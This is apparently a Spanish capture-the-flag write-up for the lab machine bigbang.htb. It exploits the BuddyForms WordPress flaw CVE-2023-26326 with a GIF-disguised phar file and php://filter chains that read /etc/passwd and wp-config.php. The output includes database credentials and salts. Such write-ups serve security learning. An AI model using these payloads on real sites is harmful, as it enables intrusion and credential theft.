Tiene el Directory listing habilitado, en la siguiente <a data-tooltip-position="top" aria-label="https://wordpress.org/themes/twentytwentyfour/" rel="noopener nofollow" class="external-link" href="https://wordpress.org/themes/twentytwentyfour/" target="_blank">ruta</a></p></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="Apis" dir="auto" class="heading" id="Apis"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Apis</h3><div class="heading-children"><div class="el-p"><p dir="auto">Encontramos varias API's a los que el servidor envia peticiones:</p></div><div class="el-pre"><pre class="language-ruby" tabindex="0"><code data-line="0" class="language-ruby is-loaded">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>bigbang<span class="token punctuation">.</span>htb<span class="token operator">/</span>wp<span class="token operator">-</span>admin<span class="token operator">/</span>admin<span class="token operator">-</span>ajax<span class="token punctuation">.</span>php
<span class="token symbol">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>bigbang<span class="token punctuation">.</span>htb<span class="token operator">/</span>wp<span class="token operator">-</span>admin<span class="token operator">/</span>upload<span class="token punctuation">.</span>php
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="Wordpress Plugin | BuddyForms" dir="auto" class="heading" id="Wordpress_Plugin_|_BuddyForms"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Wordpress Plugin | BuddyForms</h3><div class="heading-children"><div class="el-p"><p dir="auto"><a data-tooltip-position="top" aria-label="https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8" rel="noopener nofollow" class="external-link" href="https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8" target="_blank">articulo</a></p></div><div class="el-h4 heading-wrapper"><h4 data-heading="[CVE-2023-26326](https://nvd.nist.gov/vuln/detail/CVE-2023-26326)" dir="auto" class="heading" id="[CVE-2023-26326](https://nvd.nist.gov/vuln/detail/CVE-2023-26326)"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/CVE-2023-26326" rel="noopener nofollow" class="external-link" href="https://nvd.nist.gov/vuln/detail/CVE-2023-26326" target="_blank">CVE-2023-26326</a></h4><div class="heading-children"><div class="el-p"><p dir="auto">Bueno esta vulnerabilidad cosniste en subir un archivo .phar malicioso mediante <code>upload_image_from_url</code> y luego llamarlo con el wrapper phar://</p></div><div class="el-p"><p dir="auto">Pruebo primero a subir un gif para verificar que funciona el exploit; el codigo defectuoso se puede examinar en este <a data-tooltip-position="top" aria-label="https://github.com/BuddyForms/BuddyForms/blob/master/includes/functions.php#L1488" rel="noopener nofollow" class="external-link" href="https://github.com/BuddyForms/BuddyForms/blob/master/includes/functions.php#L1488" target="_blank">enlace</a>;<br>
A pesar de subirse el archivo en formato .png podemos observar que el gif funciona en la pagina por lo que podremos subir un archivo phar malicioso que el servidor interprete como GIF</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250202141748.png" src="Pasted image 20250202141748.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250202141748.png" src="machines/bigbang/imgs/pasted-image-20250202141748.png"></span></p></div><div class="el-p"><p dir="auto">dado esto procedemos  construir un exploit php</p></div><div class="el-pre"><pre class="language-php" tabindex="0"><code data-line="0" class="language-php is-loaded"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Evil</span><span class="token punctuation">{</span>  
  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">void</span> <span class="token punctuation">{</span>  
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Arbitrary Deserialization"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
  
  
<span class="token comment">//create new Phar  </span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'evil.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a\n&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
<span class="token comment">// add object of any class as meta data  </span>
<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Lo convertimos  a phar:</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">php <span class="token parameter variable">--define</span> <span class="token assign-left variable">phar.readonly</span><span class="token operator">=</span><span class="token number">0</span> evil.php
➜  CVE-2023-26326 strings evil.phar 
GIF89a
<span class="token operator">&lt;</span>?php __HALT_COMPILER<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">&gt;</span>
O:4:<span class="token string">"Evil"</span>:0:<span class="token punctuation">{</span><span class="token punctuation">}</span>
test.txt
text
GBMB
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Gif89a son los magic bytes  que van a enganar a la funcion del buddyforms <code>upload_image_from_url()</code> de tal forma que podremos exfiltrar nuestro php disfrazado de gif;</p></div><div class="el-p"><p dir="auto">Ahora lo subimos al endpoint vulnerable que admite PUT<br>
<code>wp-admin/admin-ajax.php</code></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250131141905.png" src="Pasted image 20250131141905.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250131141905.png" src="machines/bigbang/imgs/pasted-image-20250131141905.png"></span><br>
El servidor nos devuelve una URL indicando donde se ha subido nuestro archivo malicioso; Comprobamos que se ha subido correctamente navegando a la URL<br>
<code>http://blog.bigbang.htb/wp-content/uploads/2025/01/</code></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250131142115.png" src="Pasted image 20250131142115.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250131142115.png" src="machines/bigbang/imgs/pasted-image-20250131142115.png"></span></p></div><div class="el-p"><p dir="auto">Bueno pues tenemos injecion exitosa de archivos . ahora a construir el payload;</p></div><div class="el-p"><p dir="auto">Dado que continuo este writeup de nuevo dia he vuelto a subir el phar al servidor esta vez se guarda como 1-2.png dado que no puedo </p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250202143150.png" src="Pasted image 20250202143150.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250202143150.png" src="machines/bigbang/imgs/pasted-image-20250202143150.png"></span></p></div></div></div></div></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="**arbitrary file read**" dir="auto" class="heading" id="**arbitrary_file_read**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>arbitrary file read</strong></h2><div class="heading-children"><div class="el-p"><p dir="auto"><a data-tooltip-position="top" aria-label="https://github.com/ambionics/wrapwrap" rel="noopener nofollow" class="external-link" href="https://github.com/ambionics/wrapwrap" target="_blank">Git</a></p></div><div class="el-p"><p dir="auto">Vamos a usar wrapwrap para disfrazar el /etc/password en un archivo GIF anadiendo el GIF89a Header:</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ python3 wrapwrap.py <span class="token parameter variable">-h</span>
usage: wrapwrap.py <span class="token punctuation">[</span>-h<span class="token punctuation">]</span> <span class="token punctuation">[</span>-o OUTPUT<span class="token punctuation">]</span> <span class="token punctuation">[</span>-p PADDING_CHARACTER<span class="token punctuation">]</span> <span class="token punctuation">[</span>-f<span class="token punctuation">]</span> path prefix suffix nb_bytes

Generates a php://filter wrapper that adds a prefix and a suffix to the contents of a file.

Example:

    $ ./wrapwrap.py /etc/passwd <span class="token string">'&lt;root&gt;&lt;test&gt;'</span> <span class="token string">'&lt;/test&gt;&lt;/root&gt;'</span> <span class="token number">100</span>
    <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping <span class="token number">108</span> bytes from /etc/passwd.
    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wrote filter chain to chain.txt <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">88781</span><span class="token punctuation">)</span>.
    $ php <span class="token parameter variable">-r</span> <span class="token string">'echo file_get_contents(file_get_contents("chain.txt"));'</span>
    <span class="token operator">&lt;</span>root<span class="token operator">&gt;</span><span class="token operator">&lt;</span>test<span class="token operator">&gt;</span>root:x:0:0:root:/root:/bin/bash<span class="token operator">=</span>0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<span class="token operator">=</span>0Abin:x:2:2:bin:/bin:/usr/<span class="token operator">&lt;</span>/test<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/root<span class="token operator">&gt;</span>

positional arguments:
  path                  Path to the <span class="token function">file</span>
  prefix                A string to <span class="token function">write</span> before the contents of the <span class="token function">file</span>
  suffix                A string to <span class="token function">write</span> after the contents of the <span class="token function">file</span>
  nb_bytes              Number of bytes to dump. It will be aligned with <span class="token number">9</span>

options:
  -h, <span class="token parameter variable">--help</span>            show this <span class="token builtin class-name">help</span> message and <span class="token builtin class-name">exit</span>
  <span class="token parameter variable">-o</span> OUTPUT, <span class="token parameter variable">--output</span> OUTPUT
                        File to <span class="token function">write</span> the payload to. Defaults to chain.txt
  <span class="token parameter variable">-p</span> PADDING_CHARACTER, --padding-character PADDING_CHARACTER
                        Character to pad the prefix and suffix. Defaults to <span class="token variable"><span class="token variable">`</span>M<span class="token variable">`</span></span><span class="token builtin class-name">.</span>
  -f, --from-file       If set, prefix and suffix indicate files to load their value from,
                        instead of the value itself

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Modificamos la <strong>evil_url</strong> para utilizar la cadena generada por <strong>wrapwrap</strong> , luego sube el archivo a través del endpoint vulnerable. Este método evita la restricción de tipo de archivo engañando al servidor para que interprete el archivo como una imagen. Con este enfoque, podemos realizar lectura de archivos arbitrarios y filtrar el contenido del archivo subido, que se supone que es una "imagen".</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ python3 wrapwrap.py <span class="token string">'/etc/passwd'</span> <span class="token string">'GIF89a'</span> <span class="token string">''</span> <span class="token number">500000</span> 
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Ignoring nb_bytes value since there is no suffix
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wrote filter chain to chain.txt <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">1444</span><span class="token punctuation">)</span>.
<span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ <span class="token function">cat</span> chain.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────
       │ File: chain.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────
   <span class="token number">1</span>   │ php://filter/convert.base64-encode<span class="token operator">|</span>convert.iconv.855.UTF7<span class="token operator">|</span>convert.iconv.CSGB2312.UTF-
       │ <span class="token number">32</span><span class="token operator">|</span>convert.iconv.IBM-1161.IBM932<span class="token operator">|</span>convert.iconv.GB13000.UTF16BE<span class="token operator">|</span>convert.iconv.864.UTF-
       │ 32LE<span class="token operator">|</span>convert.base64-decode<span class="token operator">|</span>convert.base64-encode<span class="token operator">|</span>convert.iconv.855.UTF7<span class="token operator">|</span>convert.iconv
       │ .CP-AR.UTF16<span class="token operator">|</span>convert.iconv.8859_4.BIG5HKSCS<span class="token operator">|</span>convert.iconv.MSCP1361.UTF-32LE<span class="token operator">|</span>convert.i
       │ conv.IBM932.UCS-2BE<span class="token operator">|</span>convert.base64-decode<span class="token operator">|</span>convert.base64-encode<span class="token operator">|</span>convert.iconv.855.UTF
       │ <span class="token number">7</span><span class="token operator">|</span>convert.iconv.INIS.UTF16<span class="token operator">|</span>convert.iconv.CSIBM1133.IBM943<span class="token operator">|</span>convert.iconv.IBM932.SHIFT_
       │ JISX0213<span class="token operator">|</span>convert.base64-decode<span class="token operator">|</span>convert.base64-encode<span class="token operator">|</span>convert.iconv.855.UTF7<span class="token operator">|</span>convert.i
       │ conv.CSA_T500.UTF-32<span class="token operator">|</span>convert.iconv.CP857.ISO-2022-JP-3<span class="token operator">|</span>convert.iconv.ISO2022JP2.CP775
       │ <span class="token operator">|</span>convert.base64-decode<span class="token operator">|</span>convert.base64-encode<span class="token operator">|</span>convert.iconv.855.UTF7<span class="token operator">|</span>convert.iconv.L6.
       │ UNICODE<span class="token operator">|</span>convert.iconv.CP1282.ISO-IR-90<span class="token operator">|</span>convert.base64-decode<span class="token operator">|</span>convert.base64-encode<span class="token operator">|</span>co
       │ nvert.iconv.855.UTF7<span class="token operator">|</span>convert.iconv.CP-AR.UTF16<span class="token operator">|</span>convert.iconv.8859_4.BIG5HKSCS<span class="token operator">|</span>convert
       │ .iconv.MSCP1361.UTF-32LE<span class="token operator">|</span>convert.iconv.IBM932.UCS-2BE<span class="token operator">|</span>convert.base64-decode<span class="token operator">|</span>convert.b
       │ ase64-encode<span class="token operator">|</span>convert.iconv.855.UTF7<span class="token operator">|</span>convert.iconv.UTF8.UTF16LE<span class="token operator">|</span>convert.iconv.UTF8.CSI
       │ SO2022KR<span class="token operator">|</span>convert.iconv.UCS2.UTF8<span class="token operator">|</span>convert.iconv.8859_3.UCS2<span class="token operator">|</span>convert.base64-decode<span class="token operator">|</span>conv
       │ ert.base64-encode<span class="token operator">|</span>convert.iconv.855.UTF7<span class="token operator">|</span>convert.iconv.PT.UTF32<span class="token operator">|</span>convert.iconv.KOI8-U.
       │ IBM-932<span class="token operator">|</span>convert.iconv.SJIS.EUCJP-WIN<span class="token operator">|</span>convert.iconv.L10.UCS4<span class="token operator">|</span>convert.base64-decode<span class="token operator">|</span>con
       │ vert.base64-encode<span class="token operator">|</span>convert.iconv.855.UTF7<span class="token operator">|</span>convert.base64-decode/resource<span class="token operator">=</span>/etc/passwd
───────┴───────────────────────────────────────
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Ahora modificamos la <strong>evil_url</strong> para utilizar la cadena generada por <strong>wrapwrap</strong> , luego súbela a través del punto de entrada vulnerable. Esto evita la restricción de tipo de archivo al engañar al servidor para que interprete el archivo como una imagen. Con este método, podemos realizar con éxito la lectura de archivos arbitrarios, filtrando los contenidos del archivo subido (que se interpreta como una "imagen").</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ <span class="token builtin class-name">export</span> <span class="token assign-left variable">evil_url</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> chain.txt <span class="token variable">)</span></span>"</span> 

wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ <span class="token function">curl</span> <span class="token string">'http://blog.bigbang.htb/wp-admin/admin-ajax.php'</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-H</span> <span class="token string">'Content-Type: application/x-www-form-urlencoded'</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-d</span> <span class="token string">"action=upload_image_from_url&amp;id=1&amp;accepted_files=image/gif&amp;url=<span class="token variable">${evil_url}</span>"</span>

<span class="token punctuation">{</span><span class="token string">"status"</span><span class="token builtin class-name">:</span><span class="token string">"OK"</span>,<span class="token string">"response"</span><span class="token builtin class-name">:</span><span class="token string">"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/02\/1-4.png"</span>,<span class="token string">"attachment_id"</span>:159<span class="token punctuation">}</span>%        

<span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ <span class="token function">curl</span> <span class="token string">'http://blog.bigbang.htb//wp-content//uploads//2025//02//1-4.png'</span> <span class="token parameter variable">-o</span> exploited.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
<span class="token number">100</span>   <span class="token number">843</span>  <span class="token number">100</span>   <span class="token number">843</span>    <span class="token number">0</span>     <span class="token number">0</span>   <span class="token number">7500</span>      <span class="token number">0</span> --:--:-- --:--:-- --:--:--  <span class="token number">7526</span>
<span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ strings exploited.png 
GIF89aroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologi

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Parece que estamos en un contenedor docker al no haber mas usuarios que root con el bash;<br>
vamos a intentar leer el wp-config con el mismo procedimiento:</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ python3 wrapwrap.py <span class="token string">'../wp-config.php'</span> <span class="token string">'GIF89a'</span> <span class="token string">''</span> <span class="token number">500000</span>
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Ignoring nb_bytes value since there is no suffix
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wrote filter chain to chain.txt <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">1449</span><span class="token punctuation">)</span>.
<span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ <span class="token builtin class-name">export</span> <span class="token assign-left variable">evil_url</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> chain.txt <span class="token variable">)</span></span>"</span>                     
<span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ <span class="token function">curl</span> <span class="token string">'http://blog.bigbang.htb/wp-admin/admin-ajax.php'</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-H</span> <span class="token string">'Content-Type: application/x-www-form-urlencoded'</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-d</span> <span class="token string">"action=upload_image_from_url&amp;id=1&amp;accepted_files=image/gif&amp;url=<span class="token variable">${evil_url}</span>"</span>

<span class="token punctuation">{</span><span class="token string">"status"</span><span class="token builtin class-name">:</span><span class="token string">"OK"</span>,<span class="token string">"response"</span><span class="token builtin class-name">:</span><span class="token string">"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/02\/1-5.png"</span>,<span class="token string">"attachment_id"</span>:160<span class="token punctuation">}</span>%  

<span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ <span class="token function">curl</span> <span class="token string">'http://blog.bigbang.htb//wp-content//uploads//2025//02//1-5.png'</span> <span class="token parameter variable">-o</span> wpconfig.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
<span class="token number">100</span>  <span class="token number">3348</span>  <span class="token number">100</span>  <span class="token number">3348</span>    <span class="token number">0</span>     <span class="token number">0</span>  <span class="token number">22633</span>      <span class="token number">0</span> --:--:-- --:--:-- --:--:-- <span class="token number">22775</span>


<span class="token punctuation">(</span>venv<span class="token punctuation">)</span> ➜  wrapwrap git:<span class="token punctuation">(</span>main<span class="token punctuation">)</span> ✗ strings wpconfig.png 
GIF89a<span class="token operator">&lt;</span>?php
 * The base configuration <span class="token keyword">for</span> WordPress
 * The wp-config.php creation script uses this <span class="token function">file</span> during the installation.
 * You don<span class="token string">'t have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 * This file contains the following configurations:
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 * @package WordPress
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( '</span>DB_NAME<span class="token string">', '</span>wordpress<span class="token string">' );
/** Database username */
define( '</span>DB_USER<span class="token string">', '</span>wp_user<span class="token string">' );
/** Database password */
define( '</span>DB_PASSWORD<span class="token string">', '</span>wp_password<span class="token string">' );
/** Database hostname */
define( '</span>DB_HOST<span class="token string">', '</span><span class="token number">172.17</span>.0.1<span class="token string">' );
/** Database charset to use in creating database tables. */
define( '</span>DB_CHARSET<span class="token string">', '</span>utf8mb4<span class="token string">' );
/** The database collate type. Don'</span>t change this <span class="token keyword">if</span> <span class="token keyword">in</span> doubt. */
define<span class="token punctuation">(</span> <span class="token string">'DB_COLLATE'</span>, <span class="token string">''</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
/**<span class="token comment">#@+</span>
 * Authentication unique keys and salts.
 * Change these to different unique phrases<span class="token operator">!</span> You can generate these using
 * the <span class="token punctuation">{</span>@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service<span class="token punctuation">}</span>.
 * You can change these at any point <span class="token keyword">in</span> <span class="token function">time</span> to invalidate all existing cookies.
 * This will force all <span class="token function">users</span> to have to log <span class="token keyword">in</span> again.
 * @since <span class="token number">2.6</span>.0
define<span class="token punctuation">(</span> <span class="token string">'AUTH_KEY'</span>,         <span class="token string">'(6xl?]9=.f9(&lt;(yxpm9]5&lt;wKsyEc+y&amp;MV6CjjI(0lR2)_6SWDnzO:[g98nOOPaeK'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
define<span class="token punctuation">(</span> <span class="token string">'SECURE_AUTH_KEY'</span>,  <span class="token string">'F&lt;3&gt;KtCm^zs]Mxm Rr*N:&amp;{SWQexFn@ wnQ+bTN5UCF-&lt;gMsT[mH$m))T&gt;BqL}%8'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
define<span class="token punctuation">(</span> <span class="token string">'LOGGED_IN_KEY'</span>,    <span class="token string">':{yhPsf}tZRfMAut2$Fcne/.@Vs&gt;uukS&amp;JB04 Yy3{`$`6p/Q=d^9=ZpkfP,o%l]'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
define<span class="token punctuation">(</span> <span class="token string">'NONCE_KEY'</span>,        <span class="token string">'sC(jyKu&gt;gY(,&amp;: KS#Jh7x?/CB.hy8!_QcJhPGf@3q&lt;-a,D#?!b}h8 ao;g[&lt;OW;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
define<span class="token punctuation">(</span> <span class="token string">'AUTH_SALT'</span>,        <span class="token string">'_B&amp; tL]9I?ddS! 0^_,4M)B&gt;aHOl{}e2P(l3=!./]~v#U&gt;dtF7zR=~LnJtLgh&amp;KK'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
define<span class="token punctuation">(</span> <span class="token string">'SECURE_AUTH_SALT'</span>, <span class="token string">'&lt;Cqw6ztRM/y?eGvMzY(~d?:#]v)em`.H!SWbk.7Fj%b@Te&lt;r^^Vh3KQ~B2c|~VvZ'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
define<span class="token punctuation">(</span> <span class="token string">'LOGGED_IN_SALT'</span>,   <span class="token string">'_zl+LT[GqIV{*Hpv&gt;]H:&lt;U5oO[w:]?%Dh(s&amp;Tb-2k`1!WFqKu;elq7t^~v7zS{n['</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
define<span class="token punctuation">(</span> <span class="token string">'NONCE_SALT'</span>,       <span class="token string">'t2~PvIO1qeCEa^+J}@h&amp;x&lt;%u~Ml{=0Orqe]l+DD7S}%KP}yi(6v$mHm4cjsK,vCZ'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
/**<span class="token comment">#@-*/</span>
 * WordPress database table prefix.
